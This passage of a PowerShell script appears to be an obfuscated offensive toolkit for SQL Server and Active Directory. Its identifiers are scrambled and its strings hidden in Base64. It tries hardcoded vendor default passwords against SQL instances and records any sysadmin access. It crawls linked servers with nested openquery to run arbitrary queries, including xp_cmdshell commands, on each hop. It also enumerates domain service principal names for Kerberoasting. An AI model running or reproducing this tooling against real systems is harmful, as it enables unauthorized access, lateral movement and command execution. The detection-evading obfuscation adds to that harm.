        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAHIAcwBoAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAGwAbwBjAGkAdAB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQA1AFgAOQBGAEcANAAyAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAHIAcwBoAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQA1AFgAOQBGAEcANAAyAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAHQAZQByADAAOAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAFIARQBXAEEAUgBFAA=='))),"sa",'') | Out-Null        
        ${_____/\/\_/\_/===} = ${/==\__/=\/=\/=\/\} | measure | select count -ExpandProperty count
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${/=\/=\/\/==\___/\} = $Instance.Split("\")[1]
        if(-not ${/=\/=\/\/==\___/\}){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAbgBhAG0AZQBkACAAaQBuAHMAdABhAG4AYwBlACAAZgBvAHUAbgBkAC4A')))
            return
        }
        ${__/====\___/=====} = ""
        ${__/====\___/=====} = ${/==\__/=\/=\/=\/\} | ? { $_.instance -eq $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQBcAC8AXAAvAD0APQBcAF8AXwBfAC8AXAB9AA==')))}        
        if(${__/====\___/=====}){    
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AZgBpAHIAbQBlAGQAIABpAG4AcwB0AGEAbgBjAGUAIABtAGEAdABjAGgALgA='))) 
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAaQBuAHMAdABhAG4AYwBlACAAbQBhAHQAYwBoACAAZgBvAHUAbgBkAC4A')))
            return 
        }        
		for(${_/\_/\/\__/\____/}=0; ${_/\_/\/\__/\____/} -lt ${__/====\___/=====}.count; ${_/\_/\/\__/\____/}++){
			${/=====\__/=\_/=\_} = ${__/====\___/=====}.username[${_/\_/\/\__/\____/}]
			${_/===\_/=\/\_/\_/} = ${__/====\___/=====}.password[${_/\_/\/\__/\____/}]
			${_/\_/\/\/\/==\/=\} = Get-SQLServerInfo -Instance $instance -Username ${/=====\__/=\_/=\_} -Password ${_/===\_/=\/\_/\_/} -SuppressVerbose
			if(${_/\_/\/\/\/==\/=\}){
				Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AZgBpAHIAbQBlAGQAIABkAGUAZgBhAHUAbAB0ACAAYwByAGUAZABlAG4AdABpAGEAbABzACAALQAgACQAewAvAD0APQA9AD0APQBcAF8AXwAvAD0AXABfAC8APQBcAF8AfQAvACQAewBfAC8APQA9AD0AXABfAC8APQBcAC8AXABfAC8AXABfAC8AfQA=')))
				${__/=\/=\/\_/\____} = ${_/\_/\/\/\/==\/=\} | select IsSysadmin -ExpandProperty IsSysadmin
				${/=\_____/\/\/=\__}.Rows.Add(
					$ComputerName,
					$Instance,
					${/=====\__/=\_/=\_},
					${_/===\_/=\/\_/\_/},
					${__/=\/=\/\_/\____}
				) | Out-Null
			}else{
				Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAYwByAGUAZABlAG4AdABpAGEAbAAgAG0AYQB0AGMAaABlAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkAC4A')))
			}
		}
    }
    End
    {
        ${/=\_____/\/\/=\__}
    }
}
Function Get-SQLServerLinkCrawl{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,
        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$DAC,
        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$TimeOut = 2,
        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run. If QueryTarget isn's given, this will run on each server.")]
        [string]$Query,
        [Parameter(Mandatory=$false,
        HelpMessage="Link to run SQL query on.")]
        [string]$QueryTarget,
        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format.")]
        [switch]$Export,
        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format that is easier to work with.")]
        [switch]$Export2
    )
    Begin
    {   
        $List = @()
        $Server = New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}
        $List += $Server
        ${__/====\_/\_/=\_/} = New-Object System.Data.DataTable
    }
    Process
    {
        ${_/\_/\/\__/\____/}=1
        while(${_/\_/\/\__/\____/}){
            ${_/\_/\/\__/\____/}--
            foreach($Server in $List){
                if($Server.Instance -eq "") {
                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query -QueryTarget $QueryTarget)
                    ${_/\_/\/\__/\____/}++
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA==')))
                    Write-Verbose " Server: $($Server.Instance)"
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA==')))
                    Write-Verbose " - Link Path to server: $($Server.Path -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAD4AIAA='))))"                    
                    Write-Verbose " - Link Login: $($Server.User)"                                   
                    Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                    Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                    Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
                }   
            } 
        }
        if($Export){
            ${___/=\/\__/==\_/\} = New-Object System.Data.Datatable
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AawBzAA=='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA=='))))
            [void]${___/=\/\__/==\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHMAdABvAG0AUQB1AGUAcgB5AA=='))))
            foreach($Server in $List){
                [void]${___/=\/\__/==\_/\}.Rows.Add($Server.instance,$Server.version,$Server.path -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAD4AIAA='))), $Server.links -join ",", $Server.user, $Server.Sysadmin, $Server.CustomQuery -join ",")
            }
            return ${___/=\/\__/==\_/\}
            break
        }
        if($Export2){
            ${___/=\/\__/==\_/\} = $List | 
            foreach {
                [string]${________/=\/\/\/=} = ""
                $Path = $_.path 
                ${________/\/\__/=\} = $Path.count - 1       
                ${_/\_/\/==\/=\/===} = $Path[${________/\/\__/=\} -1]
                ${/===\___/=\__/\/=} = $Path[${________/\/\__/=\}]
                ${/==\___/=\/\/\/=\} = $_.user
                ${/=\/=\_/\/=\/\/==} = $_.Sysadmin
                $Instance = $_.instance 
                ${/======\/=\______} = $_.Version
                $Path |
                foreach {
                    if ( ${________/=\/\/\/=} -eq ""){
                        [string]${________/=\/\/\/=} = "$_" 
                    }else{
                        [string]${________/=\/\/\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8AXwBfAF8AXwAvAD0AXAAvAFwALwBcAC8APQB9ACAALQA+ACAAJABfAA==')))         
                    }
                }
                ${____/=\/==\/\/===} = New-Object PSObject        
                ${____/=\/==\/\/===} | add-member Noteproperty LinkSrc          ${_/\_/\/==\/=\/===}
                ${____/=\/==\/\/===} | add-member Noteproperty LinkName         ${/===\___/=\__/\/=}
                ${____/=\/==\/\/===} | add-member Noteproperty LinkInstance     $Instance     
                ${____/=\/==\/\/===} | add-member Noteproperty LinkUser         ${/==\___/=\/\/\/=\}
                ${____/=\/==\/\/===} | add-member Noteproperty LinkSysadmin     ${/=\/=\_/\/=\/\/==}        
                ${____/=\/==\/\/===} | add-member Noteproperty LinkVersion      ${/======\/=\______} 
                ${____/=\/==\/\/===} | add-member Noteproperty LinkHops         ${________/\/\__/=\} 
                ${____/=\/==\/\/===} | add-member Noteproperty LinkPath         ${________/=\/\/\/=}
                ${____/=\/==\/\/===} 
            } 
            return ${___/=\/\__/==\_/\}
            break
        }
        $List
    }
    End
    {
    }
}
Function Get-SQLServerLinkData{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
        $List,
        [Parameter(Mandatory=$true,
        HelpMessage="Server object to be tested")]
        $Server,
        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run")]
        $Query,
        [Parameter(Mandatory=$false,
        HelpMessage="Target of custom SQL query to run")]
        $QueryTarget
    )
    Begin
    {
        ${/==\_/\___/\/\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABAAEAAcwBlAHIAdgBlAHIAbgBhAG0AZQAgAGEAcwAgAHMAZQByAHYAZQByAG4AYQBtAGUALAAgAEAAQAB2AGUAcgBzAGkAbwBuACAAYQBzACAAdgBlAHIAcwBpAG8AbgAsACAAcwB5AHMAdABlAG0AXwB1AHMAZQByACAAYQBzACAAbABpAG4AawB1AHMAZQByACwAIABpAHMAXwBzAHIAdgByAG8AbABlAG0AZQBtAGIAZQByACgAJwBzAHkAcwBhAGQAbQBpAG4AJwApACAAYQBzACAAcgBvAGwAZQA=')))
        ${_/\__/\_/\/\_/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABzAHIAdgBuAGEAbQBlACAAZgByAG8AbQAgAG0AYQBzAHQAZQByAC4ALgBzAHkAcwBzAGUAcgB2AGUAcgBzACAAdwBoAGUAcgBlACAAZABhAHQAYQBhAGMAYwBlAHMAcwA9ADEA')))
    }
    Process
    {
        ${__/====\_/\_/=\_/} = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql ${/==\_/\___/\/\/\/})) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
        if(${__/====\_/\_/=\_/}.Servername -ne $null){
            $Server.Instance = ${__/====\_/\_/=\_/}.Servername
            $Server.Version = [System.String]::Join("",((${__/====\_/\_/=\_/}.Version)[10..25]))
            $Server.Sysadmin = ${__/====\_/\_/=\_/}.role
            $Server.User = ${__/====\_/\_/=\_/}.linkuser
            if($List.Count -eq 1) { $Server.Path += ,${__/====\_/\_/=\_/}.servername }
            ${__/====\_/\_/=\_/} = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql ${_/\__/\_/\/\_/\/\})) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
            $Server.Links = [array]${__/====\_/\_/=\_/}.srvname
            if($Query -ne ""){
                if($QueryTarget -eq "" -or ($QueryTarget -ne "" -and $Server.Instance -eq $QueryTarget)){
                    if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAKgA=')))){
                        $Query =  $Query + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACAAKAAoAG8AdQB0AHAAdQB0ACAAVgBBAFIAQwBIAEEAUgAoADgAMAAwADAAKQApACkA')))
                    }
                    if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgB4AHAAXwBkAGkAcgB0AHIAZQBlACoA')))){
                        $Query = $Query + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFcASQBUAEgAIABSAEUAUwBVAEwAVAAgAFMARQBUAFMAIAAoACgAbwB1AHQAcAB1AHQAIABWAEEAUgBDAEgAQQBSACgAOAAwADAAMAApACwAIABkAGUAcAB0AGgAIABpAG4AdAApACkA')))
                    }
                    ${__/====\_/\_/=\_/} = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
                    if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACoA')))){
                        $Server.CustomQuery = ${__/====\_/\_/=\_/}.output
                    } else {
                        $Server.CustomQuery = ${__/====\_/\_/=\_/}
                    }
                }
            }
            if(($Server.Path | sort | gu).Count -eq ($Server.Path).Count){
                foreach(${_/\/=\_/=\_/\___/} in $Server.Links){
                    ${/=\_/==\_/\/==\_/} = $Server.Path + ${_/\/=\_/=\_/\___/}
                    $List += ,(New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=${/=\_/==\_/\/==\_/}; User=""; Sysadmin=""; CustomQuery="" })
                }
            }
        } else {
            $Server.Instance = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAG8AawBlAG4AIABMAGkAbgBrAA==')))
        }
        return $List
    }
}
Function Get-SQLServerLinkQuery{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
        $Path=@(),
        [Parameter(Mandatory=$false,
        HelpMessage="SQL query to build the crawl path around")]
        $Sql, 
        [Parameter(Mandatory=$false,
        HelpMessage="Counter to determine how many single quotes needed")]
        $Ticks=0
    )
    if ($Path.length -le 1){
        return($Sql -replace "'", ("'"*[Math]::pow(2,$Ticks)))
    } else {
        return($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIAAqACAAZgByAG8AbQAgAG8AcABlAG4AcQB1AGUAcgB5ACgAIgA=')))+$Path[1]+"`","+"'"*[Math]::pow(2,$Ticks)+
        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -sql $Sql -ticks ($Ticks+1))+"'"*[Math]::pow(2,$Ticks)+")")
    }
}
Function Test-FolderWriteAccess
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder you would like to test write access to.')]
        [string]$OutFolder
    )
    Process
    {
        ${____/=\/\/====\__} = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_}))
        Try { 
            Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA='))) | Out-File $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwBfAC8APQBcAC8AXAAvAD0APQA9AD0AXABfAF8AfQA=')))
            rm $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwBfAC8APQBcAC8AXAAvAD0APQA9AD0AXABfAF8AfQA=')))
            return $true
        }Catch{  
            return $false
        }
    }
}
function Get-DomainSpn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAbwBtAGEAaQBuACAAUwBQAE4AcwAuAC4ALgA=')))
        }
        ${_/=\_____/\/\/===} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGkAZAA='))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBDAG4A'))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG4A'))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
        $null = ${_/=\_____/\/\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        ${_/=\_____/\/\/===}.Clear()
    }
    Process
    {
        try
        {
            ${/===\/\/=\/\/=\/=} = ''
            if($DomainAccount)
            {
                ${/===\/\/=\/\/=\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGEAdABlAGcAbwByAHkAPQBwAGUAcgBzAG8AbgApACgAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJABEAG8AbQBhAGkAbgBBAGMAYwBvAHUAbgB0ACkA')))
            }
            if($ComputerName)
            {
                ${/====\/=\/==\/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAkAA==')))
                ${/===\/\/=\/\/=\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGEAdABlAGcAbwByAHkAPQBjAG8AbQBwAHUAdABlAHIAKQAoAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQA9ACQAewAvAD0APQA9AD0AXAAvAD0AXAAvAD0APQBcAC8APQBcAC8AfQApAA==')))
            }
            ${/==\__/=\_/=\____} = Get-DomainObject -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAD0AJABTAHAAbgBTAGUAcgB2AGkAYwBlACoAKQAkAHsALwA9AD0APQBcAC8AXAAvAD0AXAAvAFwALwA9AFwALwA9AH0AKQA='))) -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential
            ${/==\__/=\_/=\____} | % -Process {
                [string]${__/\/\__/\_/\_/\/} = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]${/==\__/=\/=\/===\} = ${__/\/\__/\_/\_/\/} -replace ' ', ''
                foreach (${/\_______/\____/\} in $($_.properties.serviceprincipalname))
                {
                    ${/===\_/\/\/\_/==\} = ${/\_______/\____/\}.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = ${/\_______/\____/\}.split('/')[0]
                    if ($_.properties.lastlogon)
                    {
                        ${/==\/==\__/\/=\_/} = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        ${/==\/==\__/\/=\_/} = ''
                    }
                    $null = ${_/=\_____/\/\/===}.Rows.Add(
                        [string]${/==\__/=\/=\/===\},
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]${/===\_/\/\/\_/==\},
                        [string]${/\_______/\____/\},
                        ${/==\/==\__/\/=\_/},
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBhAHMAIAAkAF8A')))
            ${/==\_/\____/\__/\} = $_.InvocationInfo.ScriptLineNumber
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBhAHMAIABpAG4AIABMAGkAbgBlACAAJAB7AC8APQA9AFwAXwAvAFwAXwBfAF8AXwAvAFwAXwBfAC8AXAB9AA==')))
        }
    }
    End
    {
        if (${_/=\_____/\/\/===}.Rows.Count -gt 0)
        {
            ${___/\_/=\/\/\____} = ${_/=\_____/\/\/===}.Rows.Count
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAF8AXwB9ACAAUwBQAE4AcwAgAGYAbwB1AG4AZAAgAG8AbgAgAHMAZQByAHYAZQByAHMAIAB0AGgAYQB0ACAAbQBhAHQAYwBoAGUAZAAgAHMAZQBhAHIAYwBoACAAYwByAGkAdABlAHIAaQBhAC4A')))
            }
            Return ${_/=\_____/\/\/===}
        }
        else
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAgAFMAUABOAHMAIABmAG8AdQBuAGQALgA=')))
        }
    }
}
function Get-DomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',
        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
        if($Username -and $Password)
        {
            ${___/\__/=\_/==\_/} = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, ${___/\__/=\_/==\_/})
        }
        if ($DomainController)
        {
            try {
                ${/=\/=\/=\/\_/\___} = New-Object Collections.Generic.List[string]
                ${/=\/=\/=\/\_/\___}.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA'))))
                if($Username){
                    ${/=\/=\/=\/\_/\___}.Add($Credential.UserName)
                    ${/=\/=\/=\/\_/\___}.Add($Credential.GetNetworkCredential().Password)
                }
                ${__/\/==\_____/===} = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ${/=\/=\/=\/\_/\___}).distinguishedname
                if(-not ${__/\/==\_____/===}){ throw }
            }catch{
                Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQAIABvAHIAIABkAG8AbQBhAGkAbgAgAGMAbwBuAHQAcgBvAGwAbABlAHIAIABpAHMAIABuAG8AdAAgAHIAZQBhAGMAaABhAGIAbABlAC4A')))
                Break
            }
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+${__/\/==\_____/===}
                ${/=\/=\/=\/\_/\___}[0] = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIAJABMAGQAYQBwAFAAYQB0AGgA')))
            }
            ${__/\/=\___/\____/}= New-Object System.DirectoryServices.DirectoryEntry -ArgumentList ${/=\/=\/=\/\_/\___}
            ${__/==\/\___/\__/\} = New-Object -TypeName System.DirectoryServices.DirectorySearcher ${__/\/=\___/\____/}
        }
        else
        {
            ${__/\/==\_____/===} = ([ADSI]'').distinguishedName
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+${__/\/==\_____/===}
                ${__/\/=\___/\____/}  = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEwAZABhAHAAUABhAHQAaAA=')))
            }
            else
            {
                ${__/\/=\___/\____/}  = [ADSI]''
            }
            ${__/==\/\___/\__/\} = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList ${__/\/=\___/\____/}
        }
        ${__/==\/\___/\__/\}.PageSize = $Limit
        ${__/==\/\___/\__/\}.Filter = $LdapFilter
        ${__/==\/\___/\__/\}.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
    }
    Process
    {
        try
        {
            ${__/==\/\___/\__/\}.FindAll() | % -Process {
                $_
            }
        }
        catch
        {
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBhAHMAIAAkAF8A')))
            ${/==\_/\____/\__/\} = $_.InvocationInfo.ScriptLineNumber
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBhAHMAIABpAG4AIABMAGkAbgBlACAAJAB7AC8APQA9AFwAXwAvAFwAXwBfAF8AXwAvAFwAXwBfAC8AXAB9AA==')))
        }
    }
    End
    {
    }
}
